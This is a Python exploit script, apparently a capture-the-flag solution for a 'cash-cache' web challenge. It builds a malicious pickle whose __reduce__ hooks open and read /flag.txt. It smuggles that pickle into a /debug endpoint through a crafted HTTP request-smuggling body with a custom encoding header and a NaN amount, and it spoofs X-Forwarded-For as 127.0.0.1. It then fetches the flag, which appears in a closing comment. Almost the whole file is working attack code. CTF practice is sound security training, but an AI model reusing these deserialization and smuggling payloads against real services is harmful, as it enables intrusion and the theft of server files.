import requests

from pwn import *
from sys import argv
from cash_classes import *
import json
import uuid
import pickle, pickletools

MINIMUM_CASH = 10000000.0

def parseCash(stream_text:str):
    spent = 0
    body = ""
    while (spent < MINIMUM_CASH):
        cur, _, stream_text = stream_text.partition("\r\n")
        amount, units = cur.split(' ')
        if (units == "DOLLARS"):
            amount = float(amount)
        elif (units == "CENTS"):
            amount = float(amount)/100
        else:
            raise Exception("I can't understand the units!")
        # Dear Reader,
        #   I wrote this Ternary Operator today because I learned it
        #   in boating school. For some reason it sometimes cuts off
        #   the end of requests. But it probably is not a big deal.
        # From,
        # Patrick Star
        index = round(amount) if amount <= len(
            stream_text) else len(stream_text) - len(cur)
        cur = stream_text[:index]
        stream_text = stream_text[index:]
        if (len(cur) < amount or amount < 0):
            raise Exception("Are you trying to steal from me?")
        spent += amount
        body += cur
    return body, stream_text, spent

def parseHTTPReq(text:bytes) -> tuple[list[HTTPReq], float]:
    Requests = []
    stream_text = text.decode()
    spent = 0
    while (stream_text):
        cur, _, stream_text = stream_text.partition("\r\n")
        method, route, version = cur.split(' ')
        Headers = {}
        while (True):
            cur, _, stream_text = stream_text.partition("\r\n")
            if (cur == ''):
                break
            key, _, val = cur.partition(':')
            Headers[key] = val.replace(' ', '')
        if ("Cash-Encoding" in Headers and Headers["Cash-Encoding"] == "Money!"):
            body, stream_text, spent = parseCash(stream_text)
        else:
            body = stream_text
            stream_text = ""
        Headers['Content-Length'] = len(body)
        req = HTTPReq(method, route, version, Headers, body)
        Requests.append(req)
    return Requests, spent

# evil cash
class CashElement:
    def __init__(self):
        self.resps = {}
        self.spent = 0

    def set_resp(self, route, cached):
        self.resps[route] = cached

    def get_resp(self, route):
        return self.resps[route] if route in self.resps else None


class evil_bytes(str):
    def __reduce__(self):
        return (os.read, (6, 0x100))
    
class evil_open(str):
    def __reduce__(self):
        return (os.open, ("/flag.txt", 0))


class HTTPResp:
    def __init__(self, version, status_code, reason, headers, body):
        self.version = version
        self.status_code = status_code
        self.reason = reason
        self.headers = headers
        self.body = body

    def get_raw_resp(self):
        header_string = ""
        for key in self.headers.keys():
            header_string += f"{key}:{self.headers[key]}\r\n"
        return f"{self.version} {self.status_code} {self.reason}\r\n".encode() + header_string.encode() + b"\r\n" + self.body
    
    def __reduce__(self):
        return (self.__class__, ('HTTP/1.1', '777', 'PWNED!!', {"fd": evil_open(), "content": evil_bytes()}, b'123'))

# generate pickle
evil_cash = CashElement()
evil_resp = HTTPResp('HTTP/1.1', '777', 'PWNED!!', {}, b'hahahahaha')
print(evil_resp.get_raw_resp())
evil_cash.set_resp('/flag', evil_resp)

print(evil_cash.__getstate__())

evil_pkl = pickle.dumps(evil_cash, protocol=0)

print(evil_pkl)
pickletools.dis(evil_pkl)
evil_cash = base64.b64encode(evil_pkl)
with open('evil.pkl.b64', 'wb') as fp:
    fp.write(evil_cash)

HOST = ('cash-cache.ctf.umasscybersec.org', 80)
# HOST = ('localhost', 5000)
# HOST = ('localhost', 9000)
# HOST = ('localhost', 9001)


# get uuid to work on
s = requests.session()
resp = s.get(f"http://{HOST[0]}:{HOST[1]}/")
uid = s.cookies['uid']

# time.sleep(1)


sneak_body_body = json.dumps({
    "uid": uid,
    "data": evil_cash.decode()
})

sneak_body = \
f"""POST /debug?t={uuid.uuid4()} HTTP/1.1\r
Host: {HOST[0]}\r
X-Forwarded-For: 127.0.0.1, 127.0.0.1\r
Cookie: uid={uid}\r
Connection: close\r
Content-Type: application/json\r
Content-Length: {len(sneak_body_body)}\r
\r
{sneak_body_body}"""

money_body =  \
f"""{'nan'.ljust(len(sneak_body) - 8, chr(0xd))} DOLLARS\r
{sneak_body}"""

print(parseCash(money_body))

double_http = \
f"""GET /no HTTP/1.1\r
Host: {HOST[0]}\r
Connection: close\r
X-Forwarded-For: 127.0.0.1, 127.0.0.1\r
Content-Length: {len(money_body)}\r
Cash-Encoding: Money!\r\n\r
{money_body}"""

# context.log_level = 'debug'


httprequest, spent = parseHTTPReq(double_http.encode())
for i_req, httpreq in enumerate(httprequest):
    print(i_req, httpreq.get_raw_req().encode())


conn = remote(*HOST)
if HOST[1] == 9001:
    conn.send(sneak_body.encode())
elif HOST[1] == 9000:
    conn.send(double_http.encode())
else:
    conn.send(double_http.encode())

# conn.shutdown()
httpresp = conn.recvuntil(b'success', timeout=1)
httpresp += conn.recvuntil(b'}', timeout=1)

print(httpresp)

# del s.cookies['uid']
resp = s.get(f"http://{HOST[0]}:{HOST[1]}/flag")
print(resp.status_code, resp.headers, resp.text)

conn.interactive()
# UMASS{Wh0_L3T_P4Tr1Ck_1N_Ch4rg3_0f_Th3_C4$H_d9d6cfe3}